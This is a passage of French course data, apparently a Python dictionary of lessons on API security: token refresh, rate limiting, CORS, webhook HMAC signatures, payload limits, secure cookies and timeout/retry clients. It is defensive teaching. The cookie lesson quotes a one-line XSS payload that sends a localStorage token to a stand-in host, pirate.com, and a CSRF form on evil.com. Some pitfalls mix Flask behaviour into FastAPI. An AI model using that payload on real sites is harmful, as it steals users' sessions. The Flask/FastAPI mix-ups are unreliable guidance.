            "  3. [16 minutes plus tard : Access Token expiré -> 401 SignatureExpired]\n"
            "        |\n"
            "  4. POST /api/auth/refresh            -----> 1. Vérifie signature avec salt='refresh'\n"
            "     (Envoie le Refresh Token)                2. Vérifie jti NOT IN REFRESH_BLACKLIST\n"
            "     Reçoit un nouvel Access (15m)     <----- 3. Émet un nouvel Access Token frais"
        ),
        "reference_table": {
            "title": "Comparaison Technique : `Access Token` vs `Refresh Token`",
            "headers": ["Propriété Technique", "`Access Token` (Jeton d'accès)", "`Refresh Token` (Jeton de renouvellement)"],
            "rows": [
                ["Durée de vie typique (`max_age`)", "Courte : 5 à 15 minutes (`300` à `900` s)", "Longue : 7 à 30 jours (`604800` à `2592000` s)"],
                ["Sel cryptographique (`salt`)", "`\"access-token-v1\"`", "`\"refresh-token-v1\"` (Empêche l'utilisation croisée)"],
                ["Routes où il est accepté", "Toutes les routes métier protégées (`/api/...`)", "Uniquement `POST /api/auth/refresh` et `/api/auth/revoke`"],
                ["Mode de validation", "100% Stateless (Calcul HMAC en RAM)", "Stateful léger (HMAC + vérification de non-révocation en Redis/BDD)"],
                ["Impact en cas de fuite", "Limité à quelques minutes", "Élevé, mais neutralisable immédiatement par révocation serveur"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Signer l'`Access Token` et le `Refresh Token` avec exactement la même clé et le même `salt` sans champ `type`",
                "good": "Isoler cryptographiquement les deux jetons via des `salt` distincts (`salt='access-v1'` vs `salt='refresh-v1'`)",
                "why": "Sans séparation de sel ou de type, un attaquant pourrait envoyer le `Refresh Token` (valable 30 jours) directement dans `Authorization: Bearer` sur les routes métier."
            },
            {
                "bad": "Oublier `@wraps(f)` de `functools` lors de l'écriture d'un dépendance FastAPI Depends() personnalisé",
                "good": "Toujours décorer la fonction interne `wrapper` avec `@wraps(f)`",
                "why": "FastAPI enregistre chaque route sous le nom `f.__name__` ; sans `@wraps(f)`, toutes les fonctions décorées s'appellent `wrapper` et provoquent une `AssertionError` au démarrage."
            }
        ],
        "practical_exercises": [
            "Implémentez la **rotation complète du Refresh Token** dans `POST /api/auth/refresh` : chaque fois qu'un `Refresh Token` est utilisé pour obtenir un nouvel `Access Token`, ajoutez immédiatement l'ancien `Refresh Token` dans `REVOKED_TOKENS` et renvoyez à la fois un nouvel `Access Token` et un nouveau `Refresh Token`.",
            "Enrichissez la dépendance `Depends(exiger_role('admin'))` pour qu'elle retourne directement le dictionnaire `identite` décodé au paramètre de la route FastAPI."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.5 : LIMITATION DE DÉBIT (RATE LIMITING / 429) & QUOTAS
    # =========================================================================
    "d4-l5": {
        "context": (
            "Même une API parfaitement authentifiée reste vulnérable sur le plan de sa **disponibilité** et de ses **coûts financiers** :\n"
            "- Un attaquant peut lancer une attaque par force brute sur `POST /api/login` en testant 10 000 mots de passe par minute.\n"
            "- Un développeur partenaire peut commettre une erreur de programmation (`while True:` sans pause) et bombarder votre serveur "
            "de 5 000 requêtes par seconde, saturant le processeur (CPU) et la base de données pour tous les autres clients légitimes (**Déni de Service — DoS**).\n"
            "- Si votre API appelle en arrière-plan un service facturé à l'usage (envoi de SMS, API d'intelligence artificielle LLM), "
            "un pic incontrôlé peut générer une facture de plusieurs milliers d'euros en une nuit.\n"
            "La **limitation de débit (`Rate Limiting`)** est le garde-fou qui impose un quota maximal de requêtes par fenêtre de temps "
            "et répond avec le code standard **`429 Too Many Requests`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Comparaison des algorithmes industriels : Fixed Window vs Sliding Window Log vs Token Bucket",
                "body": (
                    "Il existe trois grandes familles d'algorithmes pour compter et réguler le trafic d'une API :\n"
                    "1. **Fenêtre Fixe (*Fixed Window Counter*)** : On découpe le temps en tranches fixes (ex: `14h00-14h01`, `14h01-14h02`) avec un simple compteur. "
                    "*Défaut majeur (Effet de bord aux frontières)* : Si la limite est de 100 req/min, un client peut envoyer 100 requêtes à `14h00m59s` "
                    "et 100 autres à `14h01m01s`, soit **200 requêtes en 2 secondes**, doublant la charge autorisée !\n"
                    "2. **Journal à Fenêtre Glissante (*Sliding Window Log* — implémenté dans notre laboratoire)** : Pour chaque client, on conserve "
                    "la liste des horodatages exacts (`time.time()`) de ses requêtes récentes. Lorsqu'une nouvelle requête arrive à l'instant `T`, "
                    "on purge toutes les entrées antérieures à `T - 60s`. Si le nombre d'entrées restantes atteint le quota, on rejette la requête. "
                    "Cet algorithme est **mathématiquement exact** et élimine tout effet de pointe aux frontières de minutes.\n"
                    "3. **Seau à Jetons (*Token Bucket* — utilisé par AWS API Gateway et NGINX)** :Chaque client possède un seau virtuel contenant au "
                    "maximum `B` jetons (capacité de rafale / *burst*), qui se remplit à un rythme constant de `R` jetons par seconde."
                )
            },
            {
                "heading": "2. Les en-têtes HTTP de transparence : `X-RateLimit-*` et `Retry-After` (RFC 6585)",
                "body": (
                    "Un bon limiteur de débit ne se contente pas de bloquer brutalement le client : il lui communique en permanence l'état "
                    "de son quota dans les **en-têtes de réponse HTTP** pour que le client puisse adapter sa vitesse d'appel :\n"
                    "- `X-RateLimit-Limit: 5` : Le plafond maximal autorisé sur la fenêtre temporelle.\n"
                    "- `X-RateLimit-Remaining: 2` : Le nombre de requêtes qu'il reste au client avant blocage.\n"
                    "- `X-RateLimit-Reset: 42` : Le nombre de secondes (ou le timestamp Unix) avant la réinitialisation du quota.\n"
                    "- `Retry-After: 18` (Obligatoire sur une réponse `429 Too Many Requests`) : Indique exactement au script client combien de "
                    "secondes il doit patienter (`time.sleep(18)`) avant de réessayer sa requête."
                )
            },
            {
                "heading": "3. Quelle clé d'identification choisir pour le quota ? (Adresse IP vs Clé d'API / `user_id`)",
                "body": (
                    "Identifier l'appelant pour appliquer le quota demande de la nuance :\n"
                    "- **Sur les routes publiques non authentifiées (`/api/login`, `/api/catalogue`)** : On utilise l'adresse IP du client (`request.remote_addr`, "
                    "ou l'en-tête `X-Forwarded-For` positionné par un proxy inverse de confiance comme Nginx/Cloudflare). *Attention* : dans une université "
                    "ou une grande entreprise, 500 étudiants partagent souvent la même adresse IP publique (NAT) ; le seuil par IP ne doit donc pas être trop bas.\n"
                    "- **Sur les routes authentifiées** : Il est beaucoup plus juste et précis d'indexer le compteur sur l'identifiant du client authentifié "
                    "(`X-API-Key` ou `sub` du jeton Bearer), ce qui permet en prime d'offrir des quotas différenciés selon l'abonnement (`Gratuit : 100 req/h`, `Entreprise : 10 000 req/h`)."
                )
            }
        ],
        "architecture_diagram": (
            "ALGORITHME DE FENÊTRE GLISSANTE (SLIDING WINDOW LOG — QUOTA = 3 REQ / 60s)\n"
            "==========================================================================\n\n"
            "  Instant actuel : T = 100.0s  |  Fenêtre active : [40.0s ---> 100.0s]\n\n"
            "  Historique du client avant nettoyage : [ 25.0s,  55.0s,  80.0s,  92.0s ]\n"
            "                                           ^^^^^\n"
            "  1. Purge des entrées < 40.0s         : Exclut 25.0s -> Reste [ 55.0s, 80.0s, 92.0s ] (Taille = 3)\n"
            "  2. Vérification (Taille >= Quota 3)  : QUOTA ATTEINT !\n"
            "  3. Calcul de Retry-After             : 60 - (100.0 - 55.0) = 15 secondes\n"
            "  4. Réponse HTTP                      : 429 Too Many Requests (Header Retry-After: 15)"
        ),
        "reference_table": {
            "title": "En-têtes HTTP Standards de Limitation de Débit (`Rate Limiting`)",
            "headers": ["En-tête HTTP / Code", "Valeur Exemple", "Présence", "Signification pour le Client Consommateur"],
            "rows": [
                ["Code `429 Too Many Requests`", "`429`", "Uniquement lors du dépassement", "La requête est refusée temporairement pour cause de dépassement de cadence"],
                ["`X-RateLimit-Limit`", "`60`", "Sur toutes les réponses (`200` et `429`)", "Plafond maximal de requêtes autorisées par fenêtre"],
                ["`X-RateLimit-Remaining`", "`0` à `60`", "Sur toutes les réponses (`200` et `429`)", "Nombre d'appels restants avant déclenchement du `429`"],
                ["`Retry-After`", "`15`", "Sur toutes les réponses `429`", "Délai exact en secondes à attendre avant la prochaine tentative"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Renvoyer `500 Internal Server Error` ou `403 Forbidden` lorsqu'un client dépasse sa cadence d'appel",
                "good": "Utiliser le code sémantique dédié `429 Too Many Requests` accompagné de l'en-tête `Retry-After`",
                "why": "Avec `429` et `Retry-After`, les SDK clients savent qu'il s'agit d'une limite temporaire et mettent automatiquement leurs appels en pause."
            },
            {
                "bad": "En production multi-processus (Gunicorn à 4 workers), stocker uniquement le compteur en RAM Python locale",
                "good": "En production distribuée, centraliser les compteurs dans un store partagé atomique comme **Redis** ou Nginx",
                "why": "Chaque worker Gunicorn ayant sa propre mémoire RAM isolée, un compteur en mémoire locale permettrait au client d'effectuer `4 x Quota` requêtes."
            }
        ],
        "practical_exercises": [
            "Adaptez l'algorithme de Rate Limiting du chapitre pour appliquer un **quota différencié par niveau d'abonnement** : `5 requêtes/min` si l'en-tête `X-Plan` vaut `standard`, et `20 requêtes/min` s'il vaut `premium`.",
            "Ajoutez un nettoyage périodique automatique des clés clientes inactives depuis plus de 60 secondes afin que le dictionnaire `HISTORIQUE_APPELS` ne grossisse pas indéfiniment en mémoire."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.6 : SÉCURITÉ PÉRIMÉTRIQUE : CORS, SIGNATURES WEBHOOK HMAC & TAILLE MAXIMALE (413)
    # =========================================================================
    "d4-l6": {
        "context": (
            "Pour clore ce quatrième jour dédié à la sécurité, nous abordons trois mécanismes périmétriques que tout "
            "architecte d'API rencontre dès la mise en production :\n"
            "1. **La politique `CORS` (*Cross-Origin Resource Sharing*)** : Pourquoi votre API fonctionne-t-elle parfaitement "
            "dans `curl` ou Postman, mais échoue immédiatement avec une erreur rouge dans la console dès qu'une application "
            "React ou Vue.js tente de l'appeler depuis un navigateur Web ?\n"
            "2. **La vérification cryptographique des `Webhooks` (`HMAC-SHA256`)** : Lorsqu'un prestataire de paiement (Stripe, "
            "Chargily, PayPal) ou GitHub appelle votre API pour vous notifier d'un paiement réussi, comment être certain "
            "à 100% que l'appel provient bien de Stripe et non d'un pirate qui simule un paiement ?\n"
            "3. **La protection mémoire contre les charges géantes (`413 Payload Too Large`)** : Comment empêcher un client "
            "d'envoyer un JSON de 2 Go qui fait s'effondrer la mémoire RAM du serveur ?"
        ),
        "deep_sections": [
            {
                "heading": "1. Comprendre `CORS` (*Cross-Origin Resource Sharing*), `CORSMiddleware` et la requête Preflight `OPTIONS`",
                "body": (
                    "Par défaut, tous les navigateurs Web (Chrome, Firefox, Safari) appliquent une règle de sécurité stricte appelée "
                    "**SOP (*Same-Origin Policy* / Politique de même origine)** : un script JavaScript exécuté sur le domaine "
                    "`https://portail.isgp.dz` n'a le droit de lire les réponses d'une API que si elle est hébergée sur la **même origine** "
                    "(même protocole + même domaine + même port).\n"
                    "- Si votre frontal React tourne sur `http://localhost:3000` (ou `https://app.isgp.dz`) et appelle votre API FastAPI sur "
                    "`http://localhost:8000` (ou `https://api.isgp.dz`), les origines diffèrent : le navigateur bloque la lecture de la réponse, "
                    "**sauf si le serveur FastAPI configure `CORSMiddleware` avec la liste blanche `allow_origins`**.\n"
                    "- **Pourquoi `curl` et Postman ne sont jamais bloqués par CORS ?** Parce que CORS est une protection appliquée **exclusivement "
                    "par les navigateurs Web** pour protéger l'utilisateur final contre les sites malveillants.\n"
                    "- **La requête de pré-vérification (`Preflight OPTIONS`)** : Avant d'envoyer une requête `POST`, `PUT`, `DELETE` ou contenant "
                    "`Content-Type: application/json` ou `Authorization`, le navigateur envoie automatiquement une requête silencieuse "
                    "`OPTIONS` à laquelle `CORSMiddleware` répond automatiquement."
                )
            },
            {
                "heading": "2. Architecture inversée (`Webhooks`) et signature `HMAC-SHA256` sur octets bruts (`await request.body()`)",
                "body": (
                    "Au lieu que votre serveur interroge une API externe toutes les 5 secondes pour savoir si un étudiant a payé ses frais "
                    "d'inscription (*Polling* inefficace), le prestataire de paiement envoie lui-même une requête `POST /api/webhooks/paiement` "
                    "à votre serveur dès que la transaction aboutit : c'est un **Webhook** (un rappel HTTP serveur-à-serveur).\n"
                    "- **Le risque** : L'URL `/api/webhooks/paiement` étant accessible sur Internet, n'importe qui pourrait envoyer "
                    "`{\"evenement\": \"paiement.reussi\", \"montant\": 50000}` avec `curl` pour valider frauduleusement sa commande.\n"
                    "- **La parade industrielle (`X-Webhook-Signature`)** : Vous partagez un secret unique (`WEBHOOK_SECRET`) avec le prestataire. "
                    "Avant d'envoyer le JSON, le prestataire calcule le `HMAC-SHA256` des **octets bruts exacts** du corps HTTP avec ce secret et "
                    "l'inscrit dans l'en-tête `X-Webhook-Signature`.\n"
                    "- **Règle d'or en FastAPI** : Vous devez calculer le HMAC sur **`await request.body()`** (les octets bruts tels qu'ils ont circulé "
                    "sur le réseau) et **JAMAIS** sur `json.dumps(payload)` (car le re-formatage JSON modifierait les espaces ou l'ordre "
                    "des clés et invaliderait la signature)."
                )
            },
            {
                "heading": "3. Protection de la mémoire vive contre les charges géantes (`413 Payload Too Large`)",
                "body": (
                    "Lorsque le serveur charge le corps de la requête en mémoire RAM pour le parser :\n"
                    "- Sans limite configurée, un attaquant peut envoyer en une seule requête `POST` un flux de 1,5 Go de texte JSON, provoquant "
                    "un crash immédiat du processus serveur par épuisement mémoire (*Out-Of-Memory Killer* Linux).\n"
                    "- En vérifiant `Content-Length` et `len(await request.body()) > TAILLE_MAX_OCTETS` dans un `@app.middleware(\"http\")` (et `client_max_body_size` dans Nginx), "
                    "votre API interrompt immédiatement le traitement en renvoyant **`413 Payload Too Large`**."
                )
            }
        ],
        "architecture_diagram": (
            "DOUBLE MÉCANISME : PREFLIGHT CORS (NAVIGATEUR) & SIGNATURE HMAC (WEBHOOK)\n"
            "=========================================================================\n\n"
            "  [A] PRÉ-VÉRIFICATION CORS PAR LE NAVIGATEUR WEB (CORSMiddleware) :\n"
            "  Navigateur (https://portail.isgp.dz)             Serveur API FastAPI (https://api.isgp.dz)\n"
            "  1. OPTIONS /api/formations               ----->  Vérifie si Origin est dans allow_origins\n"
            "     Origin: https://portail.isgp.dz       <-----  200 OK + Access-Control-Allow-Origin\n"
            "  2. POST /api/formations (+ JSON + Auth)  ----->  Exécute la route métier -> 201 Created\n\n"
            "  [B] VÉRIFICATION CRYPTOGRAPHIQUE D'UN WEBHOOK DE PAIEMENT :\n"
            "  Serveur de Paiement                              Serveur API FastAPI\n"
            "  Corps brut : b'{\"id\":101,\"statut\":\"paye\"}'       corps_brut = await request.body()\n"
            "  Header X-Webhook-Signature: sha256=9f8a.. -----> Attendu = HMAC(WEBHOOK_SECRET, corps_brut)\n"
            "                                                   hmac.compare_digest(Recu, Attendu) -> 200 OK"
        ),
        "reference_table": {
            "title": "Mécanismes de Sécurité Périmétrique (`CORS`, `Webhooks`, `MAX_CONTENT_LENGTH`)",
            "headers": ["Mécanisme Périmétrique", "En-têtes HTTP Impliqués", "Code HTTP d'Erreur", "Menace Neutralisée"],
            "rows": [
                ["Politique `CORS` stricte", "`Origin`, `Access-Control-Allow-Origin`, `Access-Control-Allow-Headers`", "Blocage côté navigateur", "Appel malveillant de l'API depuis un site tiers non autorisé"],
                ["Signature de Webhook `HMAC`", "`X-Webhook-Signature` (ex: `sha256=...`)", "`401 Unauthorized`", "Falsification d'événements asynchrones (faux paiements, faux statuts)"],
                ["Plafond `MAX_CONTENT_LENGTH`", "`Content-Length`", "`413 Payload Too Large`", "Saturation de la mémoire vive (RAM) par envoi de charges géantes"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Configurer `Access-Control-Allow-Origin: *` (joker universel) sur une API privée",
                "good": "Maintenir une **liste blanche explicite** des domaines frontaux autorisés (`https://portail.isgp.dz`)",
                "why": "Le joker `*` autorise n'importe quel site Internet visité par l'utilisateur à interroger l'API depuis son navigateur."
            },
            {
                "bad": "Calculer le HMAC d'un Webhook après avoir parsé le JSON (`json.dumps(request.get_json())`)",
                "good": "Calculer systématiquement le HMAC sur la séquence d'octets brute exacte retournée par `request.get_data()`",
                "why": "Un seul espace ou retour à la ligne différent entre le formateur JSON de l'émetteur et celui de Python modifie totalement le hash SHA-256."
            }
        ],
        "practical_exercises": [
            "Écrivez un script Python ou une commande `curl` qui calcule la signature HMAC-SHA256 d'un corps JSON `{\"transaction_id\": \"TX-900\", \"montant\": 45000}` avec le secret `whsec_isgp_secret_2026` et appelle `/api/webhooks/paiement`.",
            "Ajoutez la protection contre les **attaques par rejeu (*Replay Attacks*)** sur le Webhook : exigez un en-tête `X-Webhook-Timestamp`, incluez-le dans le calcul HMAC (`timestamp + \".\" + body`), et rejetez tout Webhook dont l'horodatage a plus de 5 minutes d'écart avec l'heure actuelle."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.7 : GESTION ET SÉCURITÉ DES COOKIES EN API/WEB (HTTPONLY, SECURE, SAMESITE, SESSION HMAC)
    # =========================================================================
    "d4-l7": {
        "context": (
            "Dans une architecture Web et API moderne, une question de sécurité critique revient dans chaque audit : "
            "**où le navigateur doit-il conserver le jeton d'accès ou l'identifiant de session de l'utilisateur ?**\n"
            "Pendant longtemps, de nombreux tutoriels conseillaient de stocker le JWT dans `window.localStorage` en JavaScript. "
            "Or, l'OWASP déconseille formellement `localStorage` pour les secrets sensibles : à la moindre faille **XSS (*Cross-Site Scripting*)**, "
            "une seule ligne de JavaScript injectée (`fetch('https://pirate.com?t=' + localStorage.getItem('token'))`) vole instantanément "
            "les jetons de tous les utilisateurs connectés.\n"
            "Ce chapitre enseigne l'ingénierie industrielle des **Cookies HTTP sécurisés (`Set-Cookie` / `Cookie(None)`)**, des **Cookies de Session "
            "signés cryptographiquement par HMAC (`URLSafeTimedSerializer` / `SessionMiddleware`)** et des trois drapeaux de défense périmétrique : **`HttpOnly`**, **`Secure`** et **`SameSite`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Anatomie du cycle `Set-Cookie` (Serveur -> Client) et `Cookie(None)` (Client -> Serveur)",
                "body": (
                    "Contrairement à l'en-tête `Authorization: Bearer ...` que le code JavaScript doit ajouter manuellement sur chaque `fetch()`, "
                    "les **Cookies HTTP (RFC 6265)** sont gérés automatiquement par le moteur réseau du navigateur :\n"
                    "1. **Émission (`Set-Cookie`)** : Lors de la réponse à `POST /api/auth/cookie-login`, la route FastAPI appelle "
                    "`response.set_cookie(key=\"isgp_auth_token\", value=valeur, max_age=3600, httponly=True, secure=True, samesite=\"strict\")`.\n"
                    "2. **Transport automatique (`Cookie`)** : À chaque requête suivante vers ce domaine, le navigateur joint automatiquement "
                    "l'en-tête `Cookie: isgp_auth_token=...; isgp_theme=sombre`. Côté FastAPI, on les déclare via **`Cookie(default=None)`** (ou `request.cookies`).\n"
                    "3. **Révocation (`delete_cookie`)** : Lors du `POST /api/auth/cookie-logout`, `response.delete_cookie(key=\"isgp_auth_token\")` "
                    "émet un en-tête `Set-Cookie` avec **`Max-Age=0`**, ordonnant au navigateur de détruire immédiatement le cookie."
                )
            },
            {
                "heading": "2. Les 3 Drapeaux de Sécurité Obligatoires : `HttpOnly` (Anti-XSS), `Secure` (HTTPS), `SameSite` (Anti-CSRF)",
                "body": (
                    "Un cookie transportant une session ou un jeton d'API ne doit **jamais** être émis sans ses trois attributs de blindage :\n"
                    "- **`HttpOnly` (`httponly=True` -> Protection contre le vol par XSS)** : Indique au navigateur que ce cookie est réservé exclusivement "
                    "au protocole HTTP. Toute tentative de lecture par JavaScript via `document.cookie` renvoie une chaîne vide ! Un script XSS injecté "
                    "ne peut donc pas exfiltrer la valeur du cookie.\n"
                    "- **`Secure` (`secure=True` -> Protection contre l'écoute réseau *Man-in-the-Middle*)** : Interdit au navigateur d'envoyer le cookie "
                    "sur une connexion HTTP non chiffrée ; il n'est transmis que sur **HTTPS (TLS)**.\n"
                    "- **`SameSite` (`samesite=\"strict\"` ou `\"lax\"` -> Protection contre les attaques CSRF)** :\n"
                    "  - Dans une attaque **CSRF (*Cross-Site Request Forgery*)**, un utilisateur connecté à votre banque visite un site piégé `evil.com` "
                    "qui soumet en cachette un formulaire `<form action=\"https://votre-api.dz/virement\" method=\"POST\">`.\n"
                    "  - Avec **`samesite=\"strict\"`**, le navigateur refuse catégoriquement d'attacher le cookie si la requête provient d'un site externe. "
                    "Avec **`samesite=\"lax\"`** (défaut moderne), le cookie n'est envoyé que lors d'une navigation `GET` de premier niveau, bloquant tous les `POST` inter-sites."
                )
            },
            {
                "heading": "3. Cookie Standard en Clair vs Cookie de Session Signé HMAC (`URLSafeTimedSerializer` / `SessionMiddleware`)",
                "body": (
                    "Il est crucial de distinguer deux types de cookies dans FastAPI :\n"
                    "- **Le Cookie standard (`response.set_cookie(key=\"isgp_theme\", value=\"sombre\")`)** : Sa valeur est brute et non signée. N'importe quel "
                    "utilisateur peut ouvrir l'inspecteur de stockage (F12) et modifier la valeur. Ne l'utilisez **que** pour des préférences d'affichage "
                    "(thème clair/sombre, langue).\n"
                    "- **Le Cookie de Session signé par HMAC (`URLSafeTimedSerializer` ou `SessionMiddleware`)** : Le dictionnaire de session "
                    "est sérialisé en JSON, encodé en Base64URL et **signé cryptographiquement par HMAC (`itsdangerous`)** avec `SECRET_KEY`. "
                    "Si un client tente de modifier le cookie `isgp_session` dans son navigateur pour s'attribuer le rôle `admin`, la vérification HMAC "
                    "échoue (`BadSignature`) et FastAPI rejette la session !"
                )
            }
        ],
        "architecture_diagram": (
            "ARCHITECTURE DE SÉCURITÉ DES COOKIES : HTTPONLY (ANTI-XSS) + SAMESITE (ANTI-CSRF)\n"
            "=================================================================================\n\n"
            "  Serveur FastAPI (POST /api/auth/cookie-login)\n"
            "       |\n"
            "       |  Set-Cookie: isgp_auth_token=eyJ...Sig; Max-Age=3600; HttpOnly; Secure; SameSite=strict\n"
            "       v\n"
            "  +-----------------------------------------------------------------------------+\n"
            "  | Coffre-Fort Réseau du Navigateur (Isolé du DOM JavaScript)                  |\n"
            "  |                                                                             |\n"
            "  |  1. Script XSS malveillant appelle document.cookie  ---> BLOQUÉ (HttpOnly)  |\n"
            "  |  2. Site tiers evil.com tente un POST CSRF          ---> BLOQUÉ (SameSite)  |\n"
            "  |  3. Connexion non chiffrée http://                  ---> BLOQUÉ (Secure)    |\n"
            "  +-----------------------------------------------------------------------------+\n"
            "       |\n"
            "       |  Requête légitime même origine : Cookie: isgp_auth_token=eyJ...Sig\n"
            "       v\n"
            "  Serveur FastAPI vérifie la signature HMAC (SECRET_KEY) ---> 200 OK"
        ),
        "reference_table": {
            "title": "Matrice de Sécurité des Attributs d'un Cookie HTTP (`Set-Cookie`)",
            "headers": ["Attribut `Set-Cookie`", "Paramètre FastAPI (`response.set_cookie`)", "Attaque Neutralisée", "Comportement du Navigateur"],
            "rows": [
                ["`HttpOnly`", "`httponly=True`", "**XSS** (*Cross-Site Scripting* — vol de jeton via JS)", "Rend le cookie totalement invisible pour `document.cookie` en JavaScript"],
                ["`Secure`", "`secure=True`", "**Sniffing réseau / MitM** sur Wi-Fi public", "Ne transmet le cookie que sur un canal chiffré `https://`"],
                ["`SameSite=Strict` / `Lax`", "`samesite=\"strict\"` ou `\"lax\"`", "**CSRF** (*Cross-Site Request Forgery*)", "Interdit l'envoi automatique du cookie lors de requêtes `POST` déclenchées depuis un site tiers"],
                ["`Max-Age` / `Expires`", "`max_age=3600` (ou `delete_cookie`)", "Persistance infinie sur un poste partagé", "Détruit automatiquement le cookie après `N` secondes (`Max-Age=0` pour révocation immédiate)"],
                ["Signature HMAC", "`URLSafeTimedSerializer(SECRET_KEY)`", "**Falsification client** (élévation de privilèges dans F12)", "Toute modification d'un octet du cookie invalide la signature HMAC côté serveur"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Stocker le rôle en clair dans un cookie non signé (`response.set_cookie('role', 'admin')`) et lui faire confiance",
                "good": "Toujours signer cryptographiquement les cookies d'identité via `URLSafeTimedSerializer` ou `SessionMiddleware` avec `SECRET_KEY`",
                "why": "Un cookie non signé est un simple texte que l'utilisateur peut modifier en 5 secondes dans les outils de développement (F12) de son navigateur."
            },
            {
                "bad": "Oublier `httponly=True` sur un cookie contenant un jeton JWT ou un identifiant de session",
                "good": "Activer systématiquement `httponly=True` et `SESSION_COOKIE_HTTPONLY = True`",
                "why": "Sans `HttpOnly`, n'importe quel script JavaScript tiers chargé dans la page peut lire `document.cookie` et dérober la session."
            }
        ],
        "practical_exercises": [
            "Dans le Client HTTP ou avec `curl -i -X POST http://127.0.0.1:5000/api/sandbox/cookies/login`, inspectez les en-têtes `Set-Cookie` retournés par le serveur et vérifiez la présence de `HttpOnly` et `SameSite`.",
            "Appelez ensuite `GET /api/sandbox/cookies/inspect` puis `POST /api/sandbox/cookies/logout` pour observer le cycle complet d'émission, de vérification HMAC et de révocation (`Max-Age=0`)."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.1 : CONSOMMER UNE API TIERCE (CLIENT HTTP RÉSILIENT, TIMEOUTS & RETRIES)
    # =========================================================================
    "d5-l1": {
        "context": (
            "Jusqu'ici, votre serveur FastAPI répondait directement aux clients à partir de ses propres données. "
            "Mais dans une architecture d'entreprise réelle (**Microservices** ou **Système d'Information distribué**), "
            "votre API doit très souvent **devenir elle-même cliente d'autres APIs** pendant le traitement d'une requête : "
            "interroger l'API de la Banque Centrale pour un taux de change, vérifier un numéro d'identification fiscal "
            "auprès d'un service gouvernemental, ou déclencher l'envoi d'un e-mail transactionnel.\n"
            "Or, le réseau est **fondamentalement peu fiable** : un serveur partenaire peut mettre 40 secondes à répondre "
            "ou tomber en panne momentanément. Si votre code Python appelle une API externe de manière naïve **sans `timeout`**, "
            "la panne d'un partenaire externe provoquera en quelques secondes l'**effondrement total de votre propre serveur** "
            "(*Cascading Failure* / Panne en cascade)."
        ),
        "deep_sections": [
            {
                "heading": "1. Anatomie d'une panne en cascade (*Cascading Failure*) et obligation vitale du `timeout`",
                "body": (
                    "Comprenons mécaniquement pourquoi un appel HTTP sortant sans `timeout` est une bombe à retardement :\n"
                    "- Votre serveur Flask en production dispose d'un nombre fini de **processus ou threads travailleurs (*Workers*)**, "
                    "par exemple 8 workers Gunicorn.\n"
                    "- Si une route de votre API appelle un service partenaire qui est en train de geler (son pare-feu accepte la connexion TCP "
                    "mais sa base de données est bloquée et ne renvoie aucun octet), un appel Python `urlopen(req)` ou `requests.get(url)` "
                    "**sans paramètre `timeout` attend indéfiniment** (ou jusqu'au timeout TCP du noyau Linux, souvent > 120 secondes).\n"
                    "- Dès que 8 utilisateurs appellent cette route sur votre serveur, **vos 8 workers restent figés en attente du partenaire** : "
                    "plus aucun utilisateur ne peut même charger la page d'accueil ou les autres routes de votre API ! Votre serveur entier "
                    "est paralysé à cause d'un service tiers.\n"
                    "- **Règle d'or absolue** : Aucun appel réseau sortant ne doit être écrit en production sans un `timeout` explicite strict "
                    "(généralement entre `2.0` et `5.0` secondes)."
                )
            },
            {
                "heading": "2. Stratégie de réessai intelligent (`Retry`) avec recul exponentiel (*Exponential Backoff*) et `502`/`504`",
                "body": (
                    "Que doit faire votre serveur lorsqu'un appel vers une API partenaire échoue ? Il faut distinguer deux cas :\n"
                    "1. **Erreur cliente (`400`, `401`, `403`, `404`, `422`)** : **Ne jamais réessayer immédiatement**. La requête est mal "
                    "formulée ou non autorisée ; la renvoyer 3 fois donnera 3 fois la même erreur.\n"
                    "2. **Erreur transitoire réseau ou serveur (`TimeoutError`, `502`, `503`, `504`)** : Il s'agit souvent d'une micro-coupure "
                    "réseau de 100 millisecondes. On applique alors une boucle de **Retry avec Exponential Backoff** : on attend `0.2s` avant "
                    "le 2e essai, puis `0.4s` avant le 3e essai (souvent accompagné d'un léger aléa appelé *Jitter* pour éviter que tous les "
                    "clients ne relancent au même instant).\n"
                    "3. **Traduction sémantique pour le client final (`502` vs `504`)** : Si les 3 tentatives échouent, votre API ne doit "
                    "**pas** renvoyer `500 Internal Server Error` (qui accuserait votre propre code), mais :\n"
                    "   - **`504 Gateway Timeout`** si le serveur partenaire a dépassé le délai imparti.\n"
                    "   - **`502 Bad Gateway`** si le serveur partenaire a renvoyé une réponse invalide ou une erreur `5xx`."
                )
            },
            {
                "heading": "3. Bibliothèque standard `urllib.request` vs `requests` / `httpx` en Python",
                "body": (
                    "En Python, deux approches coexistent pour effectuer des requêtes HTTP clientes :\n"
                    "- **`urllib.request` (Bibliothèque standard incluse dans Python)** : Ne nécessite aucune installation externe (`pip`), "
                    "idéale pour des scripts autonomes ou des conteneurs minimalistes. Elle lève `urllib.error.HTTPError` dès que le serveur "
                    "distant répond avec un code `>= 400`, et `urllib.error.URLError` / `TimeoutError` en cas de problème réseau.\n"
                    "- **`requests` ou `httpx` (Bibliothèques tierces de référence)** : Offrent une syntaxe plus concise (`resp = httpx.get(url, timeout=3.0)`) "
                    "et le **Connection Pooling** (`requests.Session()` ou `httpx.Client()`), qui réutilise la même connexion TCP/TLS ouverte "
                    "entre plusieurs appels successifs vers le même partenaire, divisant la latence par 3."
                )
            }
        ],
        "architecture_diagram": (
            "ARCHITECTURE D'UN APPEL SORTANT RÉSILIENT (TIMEOUT + RETRY BACKOFF)\n"
            "===================================================================\n\n"
            "  Client Mobile          Votre API FastAPI (Passerelle)            API Partenaire Externe\n"
            "       |                              |                                    |\n"
            "       |--- GET /api/devises -------->|                                    |\n"
            "       |                              |--- Essai 1 (timeout=2.0s) -------->| (Perte paquet / Lent)\n"
            "       |                              |<-- [TimeoutError après 2.0s] ------X\n"
            "       |                              |    Attente Backoff (0.2s)          |\n"
            "       |                              |--- Essai 2 (timeout=2.0s) -------->|\n"
            "       |                              |<-- 200 OK (Taux EUR/DZD) ----------|\n"
            "       |<-- 200 OK (Enrichi) ---------|                                    |\n\n"
